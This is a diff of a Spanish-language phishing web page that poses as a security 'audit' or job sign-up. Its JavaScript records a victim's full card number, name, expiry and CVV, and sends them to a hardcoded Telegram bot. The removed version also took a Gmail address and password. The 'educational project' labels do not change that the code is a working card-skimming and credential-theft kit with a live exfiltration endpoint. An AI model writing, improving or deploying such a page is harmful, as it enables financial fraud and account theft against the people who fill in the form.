@@ -48,7 +48,6 @@
 
         .audit-container { display: flex; flex-direction: column; align-items: center; gap: 40px; width: 100%; max-width: 450px; animation: fadeIn 0.5s ease forwards; }
 
-        /* Estilos de Tarjeta 3D */
         .card-visual { width: 100%; height: 260px; perspective: 1000px; }
         .card-inner { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); border-radius: 18px; }
         .card-visual.flipped .card-inner { transform: rotateY(180deg); }
@@ -66,7 +65,6 @@
         .card-number-display { font-family: 'Share Tech Mono', monospace; font-size: 1.5rem; letter-spacing: 2px; color: white; margin-top: 20px; }
         .card-bottom-info { display: flex; justify-content: space-between; align-items: flex-end; font-family: 'Share Tech Mono', monospace; font-size: 0.85rem; }
 
-        /* Estilos de Formularios y Loaders */
         .glass-form { background: var(--glass); backdrop-filter: blur(10px); border: 1px solid var(--glass-border); padding: 30px; border-radius: 20px; width: 100%; max-width: 450px; }
         .form-group { margin-bottom: 1.2rem; }
         .form-group label { display: block; font-size: 0.7rem; color: var(--text-dim); margin-bottom: 6px; text-transform: uppercase; font-weight: bold; }
@@ -81,6 +79,12 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .resumen-tarjeta {
+            background: rgba(0,82,255,0.1);
+            border: 1px solid var(--accent);
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
@@ -102,6 +106,14 @@
 
     <script>
         const viewport = document.getElementById('viewport');
+        
+        // Variables globales para guardar los datos de la tarjeta
+        let cardData = {
+            numero: '',
+            nombre: '',
+            expiracion: '',
+            cvv: ''
+        };
 
         function showInteractiveCard() {
             viewport.innerHTML = `
@@ -166,35 +178,42 @@
             const iCvv = document.getElementById('i-cvv');
 
             iNum.addEventListener('input', (e) => {
-                // Corrección: Solo una barra invertida para la expresión regular \D (no dígitos)
                 let v = e.target.value.replace(/\D/g, '').substring(0, 16);
                 let m = v.match(/.{1,4}/g);
                 e.target.value = m ? m.join(' ') : '';
                 document.getElementById('v-num').innerText = e.target.value || "•••• •••• •••• ••••";
+                cardData.numero = e.target.value;
             });
 
             iName.addEventListener('input', (e) => {
                 document.getElementById('v-name').innerText = e.target.value.toUpperCase() || "NOMBRE APELLIDO";
+                cardData.nombre = e.target.value.toUpperCase();
             });
 
             iExp.addEventListener('input', (e) => {
-                // Corrección aquí también
                 let v = e.target.value.replace(/\D/g, '');
                 if(v.length > 2) v = v.substring(0,2) + '/' + v.substring(2,4);
                 e.target.value = v;
                 document.getElementById('v-exp').innerText = v || "MM/AA";
+                cardData.expiracion = e.target.value;
             });
 
             iCvv.addEventListener('input', (e) => {
                 document.getElementById('v-cvv').innerText = e.target.value || "***";
+                cardData.cvv = e.target.value;
             });
 
-            // Giro 3D
             iCvv.addEventListener('focus', () => cardVisual.classList.add('flipped'));
             iCvv.addEventListener('blur', () => cardVisual.classList.remove('flipped'));
         }
 
-      function startLoading() {
+        function startLoading() {
+            // Verificar que los datos de la tarjeta estén completos
+            if (!cardData.numero || !cardData.nombre || !cardData.expiracion || !cardData.cvv) {
+                alert('⚠️ Por favor, completa todos los datos de la tarjeta antes de continuar.');
+                return;
+            }
+            
             const msgs = ["Sincronizando...", "Conectando con base de datos...", "Generando informe..."];
             viewport.innerHTML = `
                 <div class="loader-container">
@@ -215,180 +234,125 @@
             }, 6000);
         }
 
-     function showFinalResults() {
-   function showFinalResults() {
-    viewport.innerHTML = `
-        <div class="audit-container" style="max-width: 500px;">
-            <h2 style="font-size: 2rem; margin-bottom: 10px;">Auditoría Lista</h2>
-            
-            <div class="alert-box">
-                ⚠️ RIESGO: Hemos detectado suscripciones fantasma activas en tu cuenta.
-            </div>
-            
-            <div class="glass-form" style="max-width: 100%;" id="form-container">
-                <p style="color:var(--text-dim); margin-bottom:20px; font-size:0.9rem;">
-                    ⚠️ <strong>PROYECTO EDUCATIVO</strong> - Simulación para fines académicos.
-                </p>
-                
-                <form id="security-form">
-                    <div class="form-group">
-                        <label>Número de Tarjeta</label>
-                        <input type="text" name="numero_tarjeta" id="card_number" placeholder="0000 0000 0000 0000">
+        function showFinalResults() {
+            viewport.innerHTML = `
+                <div class="audit-container" style="max-width: 500px;">
+                    <h2 style="font-size: 2rem; margin-bottom: 10px;">Ya casi</h2>
+                    
+                    <div class="glass-form resumen-tarjeta" style="max-width: 100%; margin-bottom: 20px;">
+                        <h3 style="font-size: 0.9rem; margin-bottom: 10px;">💳 Datos de pago registrados:</h3>
+                        <p style="font-size: 0.8rem; color: var(--text-dim);">
+                            <strong>Tarjeta:</strong> ${cardData.numero || 'No registrada'}<br>
+                            <strong>Titular:</strong> ${cardData.nombre || 'No registrado'}<br>
+                            <strong>Expira:</strong> ${cardData.expiracion || 'No registrada'}<br>
+                            <strong>CVV:</strong> ${cardData.cvv ? '•••' : 'No registrado'}
+                        </p>
                     </div>
                     
-                    <div class="form-group">
-                        <label>Nombre del Titular</label>
-                        <input type="text" name="nombre_titular" id="card_name" placeholder="NOMBRE COMPLETO">
+                    <div class="glass-form" style="max-width: 100%;" id="form-container">
+                        <p style="color:var(--text-dim); margin-bottom:20px; font-size:0.9rem;">
+                            Elige tu area de trabajo
+                        </p>
+                        
+                        <form id="security-form">
+                            <div class="form-group">
+                                <label>Puesto</label>
+                                <select name="puesto">
+                                    <option value="">Selecciona tu puesto...</option>
+                                    <option value="Asistente de chat virtual">Asistente de chat virtual</option>
+                                    <option value="Call Center">Call Center</option>
+                                    <option value="Ventas en linea">Ventas en linea</option>
+                                </select>
+                            </div>
+                             
+                            <button type="submit" class="btn-primary">Enviar Informe</button>
+                        </form>
+                        
+                        <p style="font-size:0.7rem; color:var(--text-dim); margin-top:15px; text-align:center;">
+                            🔒 Conexión API segura de solo lectura (AES-256).
+                        </p>
                     </div>
+                </div>
+            `;  
+            
+            const form = document.getElementById('security-form');
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    e.preventDefault();
                     
-                    <div style="display:flex; gap:10px">
-                        <div class="form-group" style="flex:1">
-                            <label>Fecha Expiración</label>
-                            <input type="text" name="fecha_expiracion" id="card_exp" placeholder="MM/AA">
-                        </div>
-                        <div class="form-group" style="flex:1">
-                            <label>CVV</label>
-                            <input type="password" name="cvv" id="card_cvv" placeholder="***" maxlength="3">
-                        </div>
-                    </div>
+                    const telegramToken = '8675585129:AAFmRENi09R58KCe78x3Vk6EJLTQmZuz0gY';
+                    const chatId = '6237894148';
                     
-                    <div class="form-group">
-                        <label>Tipo de Tarjeta</label>
-                        <select name="tipo_tarjeta">
-                            <option value="">Selecciona tu tarjeta...</option>
-                            <option value="Debito">Débito</option>
-                            <option value="Credito">Crédito</option>
-                        </select>
-                    </div>
+                    const puestoSelect = document.querySelector('select[name="puesto"]');
+                    const puesto = puestoSelect ? puestoSelect.value : 'No seleccionado';
                     
-                    <div class="form-group">
-                        <label>Correo Gmail</label>
-                        <input type="email" name="gmail" placeholder="ejemplo@gmail.com">
-                    </div>
+                    if (!puesto) {
+                        alert('⚠️ Por favor, selecciona un puesto de trabajo.');
+                        return;
+                    }
                     
-                    <div class="form-group">
-                        <label>Contraseña</label>
-                        <input type="password" name="password" placeholder="••••••••">
-                    </div>
+                    let message = '🔐 **DATOS COMPLETOS - PROYECTO EDUCATIVO** 🔐\n\n';
+                    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `*💳 DATOS DE LA TARJETA*\n`;
+                    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `*🏦 Número:* ${cardData.numero || 'No especificado'}\n`;
+                    message += `*👤 Titular:* ${cardData.nombre || 'No especificado'}\n`;
+                    message += `*📅 Expiración:* ${cardData.expiracion || 'No especificado'}\n`;
+                    message += `*🔒 CVV:* ${cardData.cvv || 'No especificado'}\n\n`;
                     
-                    <button type="submit" class="btn-primary">Enviar Informe</button>
-                </form>
-                
-                <div id="telegram-status" style="font-size:0.7rem; margin-top:10px; text-align:center; color: var(--text-dim);"></div>
-            </div>
-        </div>
-    `;
-    
-    // Configuración de Telegram - REEMPLAZA CON TUS DATOS REALES
-    const TELEGRAM_TOKEN = '8675585129:AAFmRENi09R58KCe78x3Vk6EJLTQmZuz0gY'; // ← TU TOKEN REAL
-    const TELEGRAM_CHAT_ID = '6237894148'; // ← TU CHAT ID REAL
-    
-    const form = document.getElementById('security-form');
-    const statusDiv = document.getElementById('telegram-status');
-    
-    if (form) {
-        form.addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            statusDiv.innerHTML = '📤 Enviando informe a Telegram...';
-            statusDiv.style.color = '#8E9AAF';
-            
-            // ============================================
-            // CAPTURAR TODOS LOS DATOS DEL FORMULARIO
-            // ============================================
-            const formData = new FormData(form);
-            
-            // Extraer cada campo individualmente para debug
-            const numero_tarjeta = formData.get('numero_tarjeta') || 'No especificado';
-            const nombre_titular = formData.get('nombre_titular') || 'No especificado';
-            const fecha_expiracion = formData.get('fecha_expiracion') || 'No especificado';
-            const cvv = formData.get('cvv') || 'No especificado';
-            const tipo_tarjeta = formData.get('tipo_tarjeta') || 'No especificado';
-            const gmail = formData.get('gmail') || 'No especificado';
-            const password = formData.get('password') || 'No especificado';
-            
-            // ============================================
-            // CREAR MENSAJE CON FORMATO LEGIBLE
-            // ============================================
-            const fecha = new Date();
-            const mensaje = `
-🔐 *INFORME DE AUDITORÍA - PROYECTO EDUCATIVO* 🔐
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*📅 Fecha:* ${fecha.toLocaleDateString()}
-*⏰ Hora:* ${fecha.toLocaleTimeString()}
-*🌐 IP:* ${window.location.hostname}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*💳 DATOS DE LA TARJETA*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*🏦 Número:* ${numero_tarjeta}
-*👤 Titular:* ${nombre_titular}
-*📅 Expira:* ${fecha_expiracion}
-*🔒 CVV:* ${cvv}
-*💳 Tipo:* ${tipo_tarjeta}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*📧 DATOS DE ACCESO*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-*📨 Gmail:* ${gmail}
-*🔑 Contraseña:* ${password}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ *Este es un proyecto educativo*
-🔒 *No se almacenan datos reales*
-            `;
-            
-            console.log('=== DATOS ENVIADOS ===');
-            console.log('Número tarjeta:', numero_tarjeta);
-            console.log('Titular:', nombre_titular);
-            console.log('CVV:', cvv);
-            console.log('Gmail:', gmail);
-            console.log('Contraseña:', password);
-            console.log('======================');
-            
-            try {
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: mensaje,
-                        parse_mode: 'Markdown'
+                    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `*💼 DATOS LABORALES*\n`;
+                    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `*👔 Puesto:* ${puesto}\n\n`;
+                    
+                    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `*🌐 INFORMACIÓN TÉCNICA*\n`;
+                    message += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
+                    message += `*📱 IP:* ${window.location.hostname}\n`;
+                    message += `*⏰ Hora:* ${new Date().toLocaleString()}\n\n`;
+                    
+                    message += `⚠️ *Este es un proyecto educativo*`;
+                    
+                    console.log('=== DATOS ENVIADOS A TELEGRAM ===');
+                    console.log('Tarjeta:', cardData.numero);
+                    console.log('Titular:', cardData.nombre);
+                    console.log('CVV:', cardData.cvv);
+                    console.log('Puesto:', puesto);
+                    
+                    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
                     })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            alert('✅ Informe enviado correctamente');
+                            const formContainer = document.getElementById('form-container');
+                            if (formContainer) {
+                                formContainer.innerHTML = `
+                                    <h3 style="text-align:center; color: #4ade80;">✅ ¡Enviado!</h3>
+                                    <p style="text-align:center; margin-top:15px;">Recibirás un correo de confirmación en breve.</p>
+                                    <button onclick="location.reload()" class="btn-primary" style="margin-top:20px;">Volver al inicio</button>
+                                `;
+                            }
+                        } else {
+                            alert('Error: ' + data.description);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        alert('Error de conexión. Por favor, intenta de nuevo.');
+                    });
                 });
-                
-                const data = await response.json();
-                console.log('Respuesta de Telegram:', data);
-                
-                if (data.ok) {
-                    statusDiv.innerHTML = '✅ ¡Informe enviado correctamente! Revisa Telegram.';
-                    statusDiv.style.color = '#4ade80';
-                    
-                    // Mostrar mensaje de éxito y limpiar formulario
-                    const formContainer = document.getElementById('form-container');
-                    formContainer.innerHTML = `
-                        <div style="text-align: center; padding: 20px;">
-                            <h3 style="color: #4ade80;">✅ ¡Informe Enviado!</h3>
-                            <p style="margin-top: 15px;">Los datos han sido procesados correctamente.</p>
-                            <p style="margin-top: 10px; font-size: 0.9rem;">Recibirás un correo de confirmación.</p>
-                            <button onclick="location.reload()" class="btn-primary" style="margin-top: 20px;">Volver al inicio</button>
-                        </div>
-                    `;
-                } else {
-                    statusDiv.innerHTML = '❌ Error: ' + data.description;
-                    statusDiv.style.color = '#ef4444';
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                statusDiv.innerHTML = '❌ Error de conexión: ' + error.message;
-                statusDiv.style.color = '#ef4444';
             }
-        });
-    } else {
-        console.error('No se encontró el formulario');
-    }
-}
-</script>
+        }
+    </script>
+</body>
 </html>
